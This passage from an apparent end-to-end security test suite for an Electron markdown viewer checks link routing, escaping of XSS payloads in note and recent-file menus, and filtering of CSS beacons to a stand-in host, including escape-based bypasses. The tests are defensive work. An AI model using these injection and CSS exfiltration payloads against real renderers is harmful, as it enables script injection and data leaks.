      // has a NULL getAttribute('href'). baseVal is asserted to an EXACT value
      // for both spellings, because "is a string" would still hold if Chromium
      // started resolving xlink:href to the empty string - which is precisely
      // the regression that would make the two behaviour assertions below pass
      // while testing nothing.
      n11SvgShape.some(
        (s) =>
          s.text === "svgh" &&
          s.getAttrHref === "http://svg.invalid/p" &&
          s.baseVal === "http://svg.invalid/p",
      ) &&
      n11SvgShape.some(
        (s) =>
          s.text === "svgx" &&
          s.getAttrHref === null &&
          s.getAttrXlink === "http://xlink.invalid/p" &&
          s.baseVal === "http://xlink.invalid/p",
      ),
    JSON.stringify(n11SvgShape),
  );

  const n11SvgH = await n11Click("svgh");
  check(
    "N11 an SVG anchor using href is routed externally instead of throwing",
    n11SvgH.clicked.found === true &&
      n11SvgH.clicked.svgAnchor === true &&
      n11SvgH.clicked.prevented === true &&
      n11SvgH.external.length === 1 &&
      n11SvgH.external[0] === "http://svg.invalid/p" &&
      n11SvgH.openPath.length === 0 &&
      n11SvgH.exists.length === 0,
    JSON.stringify(n11SvgH),
  );

  const n11SvgX = await n11Click("svgx");
  check(
    "N11 an SVG anchor using xlink:href is routed externally instead of silently ignored",
    n11SvgX.clicked.found === true &&
      n11SvgX.clicked.svgAnchor === true &&
      n11SvgX.clicked.prevented === true &&
      n11SvgX.external.length === 1 &&
      n11SvgX.external[0] === "http://xlink.invalid/p" &&
      n11SvgX.openPath.length === 0 &&
      n11SvgX.exists.length === 0,
    JSON.stringify(n11SvgX),
  );

  // A placeholder link - markdown's `[text]()` - is a link to nowhere. It is
  // NOT stripped by the sanitizer: measured, the empty href attribute survives
  // and `link.href` resolves to index.html itself. Every arm of the delegation
  // requires a non-empty hrefAttr, so before N11 the click fell through to
  // Chromium, which treated it as a top-frame navigation to the app's own page.
  // Only main.js's will-navigate deny stood between a placeholder link and a
  // full reload that would have discarded every open tab.
  //
  // `exists.length === 0` matters as much as the rest: the fix must be an early
  // return, not a trip through the local-file arm that resolves "" against the
  // document directory and stats it.
  //
  // `prevented === true` is the conjunct that carries this assertion, and it
  // was missing from the first draft - which the revert harness caught by
  // returning VACUOUS. Every other observation here is EMPTY whether the
  // handler deliberately did nothing or was never reached at all, so without
  // reading the cancelled flag the assertion passed with the fix deleted.
  await n11EnsureAlive("about to render the placeholder fixture");
  await n11Render("# Placeholder\n\n[empty]()\n");
  const n11Empty = await n11Click("empty");
  const n11EmptyNav = await exec(`
    (() => {
      const a = Array.from(document.querySelectorAll('#viewer a'))
        .find((x) => x.textContent.trim() === 'empty');
      return { href: a ? a.getAttribute('href') : null, hasAttr: a ? a.hasAttribute('href') : false };
    })()
  `);
  check(
    "N11 a placeholder link with an empty href is a deliberate no-op, not a fall-through",
    // hasAttr pins the premise: if DOMPurify ever started stripping the empty
    // href, the anchor would fail the handler's outer `link.href` guard for a
    // different reason and this assertion would pass without testing anything.
    n11EmptyNav.hasAttr === true &&
      n11EmptyNav.href === "" &&
      n11Empty.clicked.found === true &&
      n11Empty.clicked.prevented === true &&
      n11Empty.openPath.length === 0 &&
      n11Empty.ipc.length === 0 &&
      n11Empty.external.length === 0 &&
      n11Empty.notes.length === 0 &&
      n11Empty.confirms.length === 0 &&
      n11Empty.exists.length === 0,
    JSON.stringify({ n11Empty, n11EmptyNav }),
  );

  // Whitespace-only hrefs. The handler tests emptiness with URL_BLANK
  // (/^[\u0000-\u0020]*$/ - the class the URL parser strips, NOT /^\s*$/,
  // which an earlier version of this comment claimed) while the local-file arm
  // trims separately, so in principle the two could disagree about a `&nbsp;`,
  // a BOM or a C0 control and let a "blank" href reach the path resolver.
  //
  // MEASURED, AND THE MEASUREMENT IS THE FINDING: they cannot disagree, but
  // NOT for the reason the first draft of this comment gave. The mechanism is
  // DOMPurify's own `stringTrim(initValue)` on every attribute value
  // (purify.js:1917 in the vendored 3.4.12), followed by the validity check's
  // final `else if (value) return false` (purify.js:1805-1806), which
  // explicitly KEEPS an attribute whose value is empty. Native String.trim()
  // is the filter, so the two predicates split the carriers into two different
  // outcomes rather than one:
  //
  //   \u00A0, \uFEFF - inside JS's trim set, so DOMPurify trims them to "" and
  //     keeps the attribute. `hrefAttr === ""`, where URL_BLANK and trim()
  //     trivially agree.
  //   \u0001 - a C0 control. URL_BLANK calls it blank; JS trim() does NOT, so
  //     it SURVIVES the trim, then fails IS_ALLOWED_URI, and the ATTRIBUTE IS
  //     REMOVED ENTIRELY. The anchor is then not a link at all: `link.href` is
  //     "" and the handler's outer guard rejects it before either predicate is
  //     evaluated.
  //
  // So the direction where URL_BLANK is broader than trim() is unreachable
  // because the attribute is DELETED, not because it is emptied - and note the
  // irony that the predicate R468 proposed swapping IN is the one the sanitizer
  // already applies. This is why the DOM premise is asserted SEPARATELY from
  // the behaviour: the behavioural assertion below is true for reasons that
  // have nothing to do with URL_BLANK, and a reader who saw only that assertion
  // would credit the wrong code. It is also why the revert that swapped
  // URL_BLANK for a bare trim() was withdrawn as vacuous rather than recorded
  // as proven: the property is real, but it is unobservable from the DOM.
  await n11EnsureAlive("about to render the whitespace fixture");
  await n11Render(
    "# Whitespace\n\n" +
      '<a href="&#160;">nbsp</a>\n\n' +
      '<a href="&#65279;">bom</a>\n' +
      // The C0 carrier covers the OTHER direction of the disagreement, and it
      // earns its place by behaving differently from the first two rather than
      // by confirming them. Without it the premise would describe one mechanism
      // and claim the whole class.
      '\n<a href="&#1;">ctrl</a>\n',
  );
  const n11Blank = await exec(`
    (() => {
      return Array.from(document.querySelectorAll('#viewer a')).map((a) => ({
        text: (a.textContent || '').trim(),
        hasAttr: a.hasAttribute('href'),
        href: a.getAttribute('href'),
        // The outer guard in the handler tests link.href, not the attribute,
        // so record the RESOLVED value too: a removed attribute leaves it "",
        // which is what makes the C0 carrier unreachable rather than merely
        // blank. (No backticks in this comment: it lives inside an exec()
        // template literal.)
        resolved: a.href,
      }));
    })()
  `);
  const n11ByText = Object.fromEntries((n11Blank || []).map((a) => [a.text, a]));
  check(
    "N11 the sanitizer neutralises every whitespace-only href, so URL_BLANK and trim() cannot disagree in the DOM",
    Array.isArray(n11Blank) &&
      n11Blank.length === 3 &&
      // The two carriers inside JS's trim set: attribute KEPT, value emptied.
      ["nbsp", "bom"].every(
        (t) => n11ByText[t] && n11ByText[t].hasAttr === true && n11ByText[t].href === "",
      ) &&
      // The carrier outside it: attribute REMOVED, so the anchor is not a link.
      n11ByText.ctrl &&
      n11ByText.ctrl.hasAttr === false &&
      n11ByText.ctrl.href === null &&
      n11ByText.ctrl.resolved === "",
    JSON.stringify(n11Blank),
  );

  const n11Nbsp = await n11Click("nbsp");
  const n11Bom = await n11Click("bom");
  const n11Ctrl = await n11Click("ctrl");
  check(
    "N11 a whitespace-only href is a silent no-op, never a path lookup",
    [n11Nbsp, n11Bom].every(
      (r) =>
        r.clicked.found === true &&
        r.clicked.prevented === true &&
        r.openPath.length === 0 &&
        r.ipc.length === 0 &&
        r.external.length === 0 &&
        r.notes.length === 0 &&
        r.confirms.length === 0 &&
        r.exists.length === 0,
    ),
    JSON.stringify({ n11Nbsp, n11Bom }),
  );

  // The C0 carrier is asserted SEPARATELY and with a different predicate,
  // because it is inert for a different reason and lumping it in with the two
  // above would have made the combined assertion false.
  //
  // Measured: `prevented` is FALSE here, and that is correct rather than a
  // defect. DOMPurify removed the href attribute outright, so `link.href` is ""
  // and the handler's outer `if (link && link.href)` guard declines the anchor
  // before any arm runs - there is nothing to preventDefault, and an <a> with
  // no href is not a hyperlink, so Chromium does nothing either. Asserting
  // `prevented === true` here (as a first draft did, by adding this carrier to
  // the array above) would have been asserting a falsehood and would have
  // masked the far more interesting fact that the attribute never survived.
  check(
    "N11 a C0-control href is stripped by the sanitizer, so the anchor never reaches the link policy at all",
    n11Ctrl.clicked.found === true &&
      n11Ctrl.clicked.prevented === false &&
      n11Ctrl.clicked.href === null &&
      n11Ctrl.nav.alive === true &&
      n11Ctrl.nav.href === n11BaseHref &&
      n11Ctrl.nav.mainProcessNavs.length === 0 &&
      n11Ctrl.openPath.length === 0 &&
      n11Ctrl.ipc.length === 0 &&
      n11Ctrl.external.length === 0 &&
      n11Ctrl.notes.length === 0 &&
      n11Ctrl.confirms.length === 0 &&
      n11Ctrl.exists.length === 0,
    JSON.stringify({ n11Ctrl, base: n11BaseHref }),
  );

  // THE AGGREGATE, AND WHY IT HAD TO EXIST. Before this, mainProcessNavs was
  // asserted in exactly two places (the caps carrier and the C0 carrier) and in
  // BOTH of them the other conjuncts already decided the verdict on their own.
  // No revert in the harness made an empty nav list the SOLE failing conjunct,
  // so if the witness had been permanently empty - the deprecated-positional
  // time bomb the listener comment describes - every N11 verdict would have
  // been byte-identical. A sentinel that is never the sole discriminator is
  // unproven.
  //
  // This makes it the sole discriminator for four reverts. MEASURED, not
  // assumed: under R463 the `web` carrier reports alive:true, an unchanged href
  // AND mainProcessNavs ["http://probe.invalid/page"] - so a navigation that
  // will-navigate DENIES still fires did-start-navigation, and the witness is
  // therefore live rather than merely quiet. Under R461/R462/R466 the carriers
  // fall through to Chromium, which starts a main-frame navigation the deny
  // then cancels: the frame survives, `href` is unchanged, and this aggregate
  // is the ONLY assertion that can see it.
  const n11All = {
    txt: n11Txt,
    md: n11Md,
    web: n11Web,
    caps: n11Caps,
    svgh: n11SvgH,
    svgx: n11SvgX,
    empty: n11Empty,
    nbsp: n11Nbsp,
    bom: n11Bom,
    ctrl: n11Ctrl,
  };
  const n11Started = Object.entries(n11All)
    .filter(
      ([, r]) => !r.nav || !Array.isArray(r.nav.mainProcessNavs) || r.nav.mainProcessNavs.length,
    )
    .map(([k, r]) => [k, r.nav ? r.nav.mainProcessNavs : null]);
  check(
    "N11 no link click anywhere in this section started a main-frame navigation",
    // The length check is a vacuity guard: it pins that every carrier really
    // was collected, so a future edit that drops one from the object cannot
    // shrink the claim silently.
    Object.keys(n11All).length === 10 && n11Started.length === 0,
    JSON.stringify({ carriers: Object.keys(n11All).length, started: n11Started }),
  );

  // TERMINAL RECONCILIATION. The per-click slices are taken 140ms after the
  // click, so a navigation that started later lands in NO slice and would be
  // invisible to every assertion above - the index arithmetic proves what was
  // observed between the mark and the read, which is weaker than "nothing
  // happened". This closes the gap from the other end: the listener's total
  // must equal every recovery reload plus everything any slice reported.
  // Anything else is an event no assertion accounted for.
  // MEASURED CORRECTION: there is no "+1 for the initial load". The listener is
  // attached long AFTER main.js has loaded index.html, so on a clean tree it
  // sees exactly zero events - which the first version of this assertion got
  // wrong, reporting seen:0 against accounted:1 and failing at rest. A revert
  // scored against a permanently-failing assertion is indistinguishable from a
  // real proof, so this is the half that had to be right before any revert
  // could use it.
  const n11Accounted =
    n11RecoveryLoads +
    Object.values(n11All).reduce(
      (n, r) =>
        n + (r.nav && Array.isArray(r.nav.mainProcessNavs) ? r.nav.mainProcessNavs.length : 0),
      0,
    );
  check(
    "N11 every main-frame navigation the main process saw is accounted for by a click slice or a recovery reload",
    n11Navs.length === n11Accounted,
    JSON.stringify({
      seen: n11Navs.length,
      accounted: n11Accounted,
      recoveryLoads: n11RecoveryLoads,
      navs: n11Navs,
    }),
  );

  // The navigation witness is scoped to this section. Left attached it would
  // keep recording for every later block in this file - harmless in itself,
  // but it makes the listener's lifetime longer than the claim it supports,
  // and a listener nobody reads is the same defect as a field nobody reads.
  //
  // DETACHED BEFORE THE TEARDOWN BELOW, not after, and that ordering is a
  // MEASUREMENT rather than a preference. Every claim the witness supports -
  // the ten per-click slices, the aggregate and the reconciliation - has been
  // evaluated by this line, so it has nothing left to observe; and the
  // recovery immediately below may issue a reload of its own, which would
  // otherwise be recorded after the reconciliation that is supposed to account
  // for every event it sees.
  win.webContents.removeListener("did-start-navigation", onN11Nav);

  // THE TEARDOWN NEEDS A LIVE DOCUMENT, AND THAT WAS NOT GUARDED - but the
  // stated reason below was WRONG, and the retraction is kept visible because
  // this project treats a wrong record as worse than no record.
  //
  // WHAT THIS COMMENT ORIGINALLY CLAIMED: "R463 and R465 both leave the top
  // frame at `about:blank#blocked` after the LAST carrier click, so the exec
  // below ran against Chromium's blocked page, where neither `require` nor
  // `window.__n11SavedExternal` exists, and threw."
  //
  // REFUTED BY MEASUREMENT. Under R463 the frame is destroyed by the `caps`
  // carrier, which is the SECOND of four that navigate - the two SVG carriers
  // follow it and both report `alive:true`, because n11Click calls
  // n11EnsureAlive first and the recovery had already rebuilt the document. So
  // `alive0` is true by the time this line runs, this guard returns
  // immediately, and the restore exec below has always succeeded: its own
  // assertion, `the local openExternal stub is fully removed and the shared
  // trap answers again`, PASSES under R463. The abort was twenty lines further
  // on, in SEC-13, on `window.__e2eErrors.length = 0` - a SUITE-level global
  // the recovery reload destroyed and did not reinstall. See E2E_SENTINEL at
  // the top of this file.
  //
  // THE GUARD STAYS ANYWAY, on the R202 precedent that an unreachable guard is
  // still a contract: no carrier is currently last-and-fatal, but that is a
  // property of which reverts exist today, not of the teardown.
  //
  // WHAT REMAINS TRUE, AND IS THE REASON ANY OF THIS MATTERED: aborting
  // anywhere in this file means every later block simply never runs, so its
  // assertions cannot fail - they cease to exist. That is exactly what the
  // long-standing R463 anomaly was: `SEC-11 an <area href> is routed through
  // the link policy, not Chromium` was reported as `missing=` and read as a
  // wrong guard about <area> handling, when in fact the assertion had never
  // been reached. An aborted suite is indistinguishable from a passing one for
  // every assertion after the abort point. With the sentinel reinstalled the
  // suite runs all 161 assertions under R463 and that <area> assertion fails
  // on its own merits - measured, not predicted.
  await n11EnsureAlive("about to restore the external opener");

  await exec(`
    (() => {
      require('electron').shell.openExternal = window.__n11SavedExternal;
      delete window.__n11SavedExternal;
      return null;
    })()
  `);

  // The N11 stub shadowed the SHARED external trap that every windowed suite
  // installs (test-visual-utils.js trapExternalOpens). If it is not fully
  // removed, every later block in this file records into a dead local array
  // and the trap that stops the harness launching the user's browser is
  // silently disarmed - which is exactly the defect that trap was written for
  // after the user reported accumulating tabs.
  //
  // Asserted BEHAVIOURALLY rather than by checking the saved slot is gone: the
  // slot being deleted says nothing about which function is now installed. A
  // probe call must land in the shared trap's array.
  const n11Restored = await exec(`
    (() => {
      const before = (window.__externalOpens || []).length;
      const localBefore = (window.__n11External || []).length;
      require('electron').shell.openExternal('https://n11-restore-probe.invalid/');
      const after = window.__externalOpens || [];
      return {
        savedGone: typeof window.__n11SavedExternal === 'undefined',
        trapInstalled: window.__externalTrapInstalled === true,
        grew: after.length === before + 1,
        last: after[after.length - 1] || null,
        localUntouched: (window.__n11External || []).length === localBefore,
      };
    })()
  `);
  check(
    "N11 the local openExternal stub is fully removed and the shared trap answers again",
    n11Restored.savedGone === true &&
      n11Restored.trapInstalled === true &&
      n11Restored.grew === true &&
      n11Restored.last === "https://n11-restore-probe.invalid/" &&
      // The probe must land in the SHARED array and nowhere else. Without this
      // conjunct a stub that recorded into both would pass.
      n11Restored.localUntouched === true,
    JSON.stringify(n11Restored),
  );

  await exec(`
    (() => {
      const { shell, ipcRenderer } = require('electron');
      const nodeFs = require('fs');
      const r = window.__s12Restore;
      shell.openPath = r.openPath;
      ipcRenderer.send = r.send;
      nodeFs.existsSync = r.existsSync;
      window.confirm = r.confirm;
      window.showNotification = r.notify;
      return null;
    })()
  `);

  // ==========================================================================
  // SEC-13 / SEC-14 - attacker-controlled strings reaching innerHTML in the
  // app's own chrome (notes tooltip, All-Notes panel, recent-files menu).
  //
  // These are not part of the rendered document, so the render-pipeline
  // assertions above say nothing about them. `data-note-id`, `data-note-title`,
  // `data-note-content` and `data-note-color` are all explicitly allowlisted in
  // the DOMPurify config, so their values arrive here exactly as authored.
  // ==========================================================================
  const NOTE_PAYLOAD_ID = `1"><img src=x onerror="window.__pwned='note-id'">`;
  const NOTE_PAYLOAD_COLOR = `red"><img src=x onerror="window.__pwned='note-color'">`;
  const htmlAttr = (s) =>
    s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

  await render(
    [
      "# Notes chrome",
      "",
      `Here is <span class="noted-text" data-note-id="${htmlAttr(NOTE_PAYLOAD_ID)}" ` +
        `data-note-color="${htmlAttr(NOTE_PAYLOAD_COLOR)}" ` +
        `data-note-title="Title" data-note-content="Body">noted</span> text.`,
      "",
    ].join("\n"),
    "full",
  );

  const attrsSurvived = await exec(`
    (() => {
      const el = document.querySelector('#viewer .noted-text');
      if (!el) return { found: false };
      return {
        found: true,
        id: el.getAttribute('data-note-id'),
        color: el.getAttribute('data-note-color'),
      };
    })()
  `);
  // Without this the two assertions below could pass simply because DOMPurify
  // stripped the attributes and there was never anything to escape.
  check(
    "SEC-13 the payload really does survive DOMPurify into data-note-* (control)",
    attrsSurvived.found === true &&
      attrsSurvived.id === NOTE_PAYLOAD_ID &&
      attrsSurvived.color === NOTE_PAYLOAD_COLOR,
    JSON.stringify(attrsSurvived),
  );

  const panel = await exec(`
    (() => {
      window.__pwned = null;
      window.__e2eErrors.length = 0;
      updateNotesList();
      const list = document.getElementById('notesList');
      const idSpan = list.querySelector('.notes-item-id');
      const item = list.querySelector('.notes-item');
      let clickThrew = null;
      try { item && item.click(); } catch (e) { clickThrew = String(e && e.message || e); }
      return {
        injected: list.querySelectorAll('img, script, iframe').length,
        idText: idSpan ? idSpan.textContent : null,
        borderLeftColor: item ? getComputedStyle(item).borderLeftColor : null,
        clickThrew,
        pwned: window.__pwned,
      };
    })()
  `);
  await sleep(200);
  check(
    "SEC-13 a data-note-id payload renders as text in the All-Notes panel",
    panel.injected === 0 &&
      panel.idText === "#" + NOTE_PAYLOAD_ID &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(panel),
  );
  check(
    "SEC-13 a data-note-color payload is normalized away rather than applied",
    panel.borderLeftColor === "rgb(255, 102, 0)",
    JSON.stringify(panel),
  );
  // The listener runs asynchronously, so a broken selector surfaces as an
  // uncaught error rather than a throw at the .click() call site - checking
  // only clickThrew would miss it entirely.
  const panelClickErrors = await exec(`window.__e2eErrors.slice()`);
  check(
    "SEC-13 clicking the panel item does not break the attribute selector",
    panel.clickThrew === null && panelClickErrors.length === 0,
    JSON.stringify({ clickThrew: panel.clickThrew, errors: panelClickErrors }),
  );

  const tip = await exec(`
    (() => {
      window.__pwned = null;
      const el = document.querySelector('#viewer .noted-text');
      showNoteTooltip(el, true);
      const t = document.getElementById('noteTooltip');
      return {
        injected: t.querySelectorAll('img, script, iframe').length,
        text: t.textContent,
        closeButtons: t.querySelectorAll('.note-tooltip-close').length,
      };
    })()
  `);
  await sleep(200);
  check(
    "SEC-13 a data-note-id payload renders as text in the note tooltip",
    tip.injected === 0 &&
      tip.text.includes(NOTE_PAYLOAD_ID) &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(tip),
  );
  check(
    "FEATURE the pinned tooltip still has a working close button",
    tip.closeButtons === 1,
    JSON.stringify(tip),
  );
  await exec(`closeNoteTooltip(); null`);

  // SEC-14: `<`, `>`, `"` and `&` are all legal in filenames on the Linux and
  // macOS release targets, and recent files are persisted, so a hostile name
  // re-arms the payload on every launch.
  const RECENT_PAYLOAD = `/tmp/<img src=x onerror="window.__pwned='recent'">.md`;
  const recent = await exec(`
    (() => {
      window.__pwned = null;
      const saved = localStorage.getItem('recentFiles');
      try {
        saveRecentFile(${JSON.stringify(RECENT_PAYLOAD)});
        updateFileMenuRecent();
        const host = document.getElementById('fileMenuRecent');
        const name = host.querySelector('.tools-menu-recent-name');
        return {
          injected: host.querySelectorAll('img, script, iframe').length,
          nameText: name ? name.textContent : null,
          pathText: host.querySelector('.tools-menu-recent-path').textContent,
        };
      } finally {
        if (saved === null) localStorage.removeItem('recentFiles');
        else localStorage.setItem('recentFiles', saved);
        updateFileMenuRecent();
      }
    })()
  `);
  await sleep(200);
  check(
    "SEC-14 a hostile filename renders as text in the recent-files menu",
    recent.injected === 0 &&
      recent.nameText === `<img src=x onerror="window.__pwned='recent'">.md` &&
      recent.pathText === RECENT_PAYLOAD &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(recent),
  );

  // <iframe> is in ADD_TAGS (for @@@html) and `src` is allowed by DOMPurify by
  // default, so `<iframe src="https://…">` in plain markdown would otherwise
  // fetch and run a remote page with no click at all. The app's own iframes are
  // srcdoc-only, so `src` is stripped in the sanitizer hook.
  await render(
    '# Nav\n\n<iframe src="https://probe.invalid/frame"></iframe>\n',
    "full",
    1200,
  );
  const frameState = await exec(`
    (() => {
      const f = document.querySelector('#viewer iframe');
      return {
        // Control: the iframe element itself must still be there, otherwise
        // this passes because the render failed rather than because src went.
        present: !!f,
        src: f ? f.getAttribute('src') : 'NO-IFRAME',
        sandbox: f ? f.getAttribute('sandbox') : null
      };
    })()
  `);
  check(
    "SEC-11 a remote <iframe src> is stripped, the sandboxed element survives",
    frameState.present === true &&
      frameState.src === null &&
      frameState.sandbox === "allow-scripts",
    JSON.stringify(frameState),
  );

  // SEC-21 - inline `style` cannot be removed from the allowlist (notes, themes
  // and upstream markdown all use it), so CSS is a fetch surface the link policy
  // never sees. `img-src https:` is deliberately open, so the CSP does not stop
  // a background-image beacon either. These drive the real sanitizer.
  await render(
    "# CSS\n\n" +
      '<div id="css-remote" style="color:rgb(1,2,3);background-image:url(https://probe.invalid/beacon?doc=secret)">a</div>\n\n' +
      '<div id="css-escaped" style="background-image:url(\\68 ttps://probe.invalid/esc)">b</div>\n\n' +
      '<div id="css-share" style="background-image:url(//probe.invalid/share/x.png)">c</div>\n\n' +
      '<div id="css-imageset" style="background-image:-webkit-image-set(&quot;https://probe.invalid/set.png&quot; 1x)">d</div>\n\n' +
      '<div id="css-data" style="background-image:url(data:image/png;base64,iVBORw0KGgo=)">e</div>\n\n' +
      '<div id="css-relative" style="background-image:url(pics/local.png)">f</div>\n\n' +
      "<style>@import url(https://probe.invalid/sheet.css); .x { background: url(https://probe.invalid/in-style.png); }</style>\n",
    "full",
    1200,
  );
  const cssState = await exec(`
    (() => {
      const at = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('style') || '') : 'NO-ELEMENT';
      };
      const styleEl = document.querySelector('#viewer style');
      return {
        remote: at('css-remote'),
        escaped: at('css-escaped'),
        share: at('css-share'),
        imageset: at('css-imageset'),
        data: at('css-data'),
        relative: at('css-relative'),
        styleText: styleEl ? styleEl.textContent : 'NO-STYLE-ELEMENT'
      };
    })()
  `);
  const noProbe = (s) => typeof s === "string" && !s.includes("probe.invalid");
  check(
    "SEC-21 a remote CSS url() in a style attribute is neutralised",
    noProbe(cssState.remote) && cssState.remote.includes('url("about:blank")'),
    JSON.stringify(cssState.remote),
  );
  // Control: neutralising the URL must not destroy the rest of the declaration,
  // otherwise the fix is indistinguishable from dropping `style` altogether -
  // which is the outcome this whole entry exists to avoid.
  check(
    "SEC-21 the surviving declarations in that style attribute are untouched",
    typeof cssState.remote === "string" &&
      /rgb\(1,\s*2,\s*3\)/.test(cssState.remote),
    JSON.stringify(cssState.remote),
  );
  check(
    "SEC-21 a CSS-escaped scheme (\\68 ttps:) does not bypass the filter",
    noProbe(cssState.escaped) && cssState.escaped.includes('url("about:blank")'),
    JSON.stringify(cssState.escaped),
  );
  check(
    "SEC-21 a protocol-relative CSS url() is neutralised (SMB/NTLM leak)",
    noProbe(cssState.share) && cssState.share.includes('url("about:blank")'),
    JSON.stringify(cssState.share),
  );
  check(
    "SEC-21 image-set(), which needs no url() wrapper, is neutralised too",
    noProbe(cssState.imageset),
    JSON.stringify(cssState.imageset),
  );
  check(
    "SEC-21 an inert data:image URL is kept, so legitimate CSS still works",
    typeof cssState.data === "string" &&
      cssState.data.includes("data:image/png;base64"),
    JSON.stringify(cssState.data),
  );
  check(
    "SEC-21 a relative CSS url() is kept",
    typeof cssState.relative === "string" &&
      cssState.relative.includes("pics/local.png") &&
      !cssState.relative.includes("about:blank"),
    JSON.stringify(cssState.relative),
  );
  check(
    "SEC-21 a <style> element's text is filtered, and @import removed entirely",
    typeof cssState.styleText === "string" &&
      cssState.styleText !== "NO-STYLE-ELEMENT" &&
      !cssState.styleText.includes("probe.invalid") &&
      !/@import/i.test(cssState.styleText),
    JSON.stringify(cssState.styleText),
  );

  // The three bypass classes below were all found by independent review AFTER
  // the first version of this filter passed its own tests, and all three were
  // confirmed live against Chromium (the engine really does resolve them to a
  // fetch) before being fixed. They are the reason the filter now normalises
  // through Chromium's own parser instead of trusting hand-written regexes:
  //
  //   1. `url("ht\<LF>tps://…")` - a backslash-newline line continuation inside
  //      a string is consumed by CSS and produces nothing, so the engine sees a
  //      scheme where the regex saw none.
  //   2. `\75rl(…)`, `\69mage-set(…)`, `@im\70ort` - the *identifier* can be
  //      escaped too, not just the value inside it.
  //   3. an SVG-namespaced <style>, whose localName is lower case.
  await render(
    "# Escapes\n\n" +
      '<div id="esc-nl" style="background-image:url(&quot;ht\\\ntps://probe.invalid/nl&quot;)">a</div>\n\n' +
      '<div id="esc-fn" style="background-image:\\75rl(//probe.invalid/share/fn.png)">b</div>\n\n' +
      "<div id=\"esc-set\" style=\"background-image:\\69mage-set('https://probe.invalid/set2.png' 1x)\">c</div>\n\n" +
      '<div id="esc-var" style="--evil:url(&quot;ht\\\ntps://probe.invalid/varleak&quot;);background-image:var(--evil)">d</div>\n\n' +
      '<style>@im\\70ort "https://probe.invalid/escaped-import.css"; .z { background: url(https://probe.invalid/z.png); }</style>\n\n' +
      '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
      "<style>.s{background:url(&quot;https://probe.invalid/svgstyle&quot;)}</style>" +
      '<rect id="esc-svgrect" width="10" height="10" style="fill:red;background-image:url(https://probe.invalid/svgattr)"/>' +
      "</svg>\n",
    "full",
    1200,
  );
  const escState = await exec(`
    (() => {
      const at = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('style') || '') : 'NO-ELEMENT';
      };
      const styles = [...document.querySelectorAll('#viewer style')].map(s => s.textContent);
      return {
        nl: at('esc-nl'),
        fn: at('esc-fn'),
        set: at('esc-set'),
        varLeak: at('esc-var'),
        svgRect: at('esc-svgrect'),
        styleTexts: styles,
        // Control: the SVG must actually have survived sanitization, otherwise
        // the SVG assertions below pass because nothing rendered.
        svgPresent: !!document.querySelector('#viewer svg')
      };
    })()
  `);
  check(
    "SEC-21 a backslash-newline line continuation does not hide a scheme",
    noProbe(escState.nl),
    JSON.stringify(escState.nl),
  );
  check(
    "SEC-21 an escaped url() identifier (\\75rl) is still filtered",
    noProbe(escState.fn),
    JSON.stringify(escState.fn),
  );
  check(
    "SEC-21 an escaped image-set() identifier (\\69mage-set) is still filtered",
    noProbe(escState.set),
    JSON.stringify(escState.set),
  );
  // Custom properties are stored as raw token streams and are NOT canonicalised
  // by the engine, so var() is an independent route to a live URL.
  check(
    "SEC-21 a remote URL smuggled through a CSS custom property is filtered",
    noProbe(escState.varLeak),
    JSON.stringify(escState.varLeak),
  );
  check(
    "SEC-21 an escaped at-keyword (@im\\70ort) does not survive",
    Array.isArray(escState.styleTexts) &&
      escState.styleTexts.every((t) => !/probe\.invalid/.test(t)) &&
      escState.styleTexts.every((t) => !/@im/i.test(t)),
    JSON.stringify(escState.styleTexts),
  );
  check(
    "SEC-21 an SVG-namespaced <style> is filtered too (localName is lower case)",
    escState.svgPresent === true &&
      Array.isArray(escState.styleTexts) &&
      escState.styleTexts.every((t) => !/svgstyle/.test(t)),
    JSON.stringify({ present: escState.svgPresent, styles: escState.styleTexts }),
  );
  check(
    "SEC-21 a style attribute on an SVG element is filtered",
    noProbe(escState.svgRect),
    JSON.stringify(escState.svgRect),
  );

  // The SEC-21 hook rewrites the `style` attribute on EVERY sanitized document,
  // so it can plausibly break ordinary formatting rather than only the hostile
  // case. The assertions above cannot see that - they read attribute text, not
  // pixels. This renders a document of ordinary inline-styled markdown and
  // leaves a screenshot for a human to look at, which is how the mermaid theme
  // bug was caught after seventeen geometry assertions missed it.
  await render(
    "# Styled document\n\n" +
      '<p style="color:#e06c75;font-size:20px">Coloured, larger text.</p>\n\n' +
      '<p style="background:#2c313a;padding:12px;border-left:4px solid #61afef">' +
      "A callout with a background, padding and a border.</p>\n\n" +
      '<span style="font-weight:bold">Bold via inline style</span> and ' +
      '<span style="text-decoration:underline">underline</span>.\n\n' +
      "| Col | Value |\n|---|---|\n| a | 1 |\n| b | 2 |\n",
    "full",
    900,
  );
  const styledLook = await exec(`
    (() => {
      const ps = [...document.querySelectorAll('#viewer p')];
      const cs = (el) => el ? getComputedStyle(el) : null;
      const a = cs(ps[0]);
      const b = cs(ps[1]);
      // BORDER WIDTHS ARE SNAPPED TO WHOLE DEVICE PIXELS; padding, font size
      // and colour are not - which is why every other value here is exact and
      // this one is not. Measured on a real machine: 3.84px, which is 6 device
      // pixels at an effective scale of 1.5625, for a declared 4px. An oracle
      // that demanded the literal string "4px" was asserting that the display
      // scale divides 4 into whole device pixels, and failed on the platform
      // rather than on the product.
      //
      // THE SCALE IS DERIVED FROM THE PLATFORM, NOT GUESSED. Chromium's
      // window.devicePixelRatio is deviceScaleFactor x pageZoomFactor when
      // zoom-for-DSF is on (the Windows default), and webFrame.getZoomFactor()
      // is the page zoom alone - so multiplying them together DOUBLE-COUNTS the
      // zoom on that configuration and is correct on the other. Rather than
      // assume which build this is, both compositions are enumerated and the
      // observation must match one of them EXACTLY.
      let zoomFactor = null;
      try {
        zoomFactor = require('electron').webFrame.getZoomFactor();
      } catch (error) {
        zoomFactor = null;
      }
      const dpr = window.devicePixelRatio || 1;
      const candidates = [];
      if (Number.isFinite(dpr) && dpr > 0) candidates.push({ how: "devicePixelRatio", scale: dpr });
      if (Number.isFinite(zoomFactor) && zoomFactor > 0 && Math.abs(zoomFactor - 1) > 1e-9) {
        candidates.push({ how: "devicePixelRatio*zoomFactor", scale: dpr * zoomFactor });
      }
      // What a declared width of n CSS px is actually painted as at scale s.
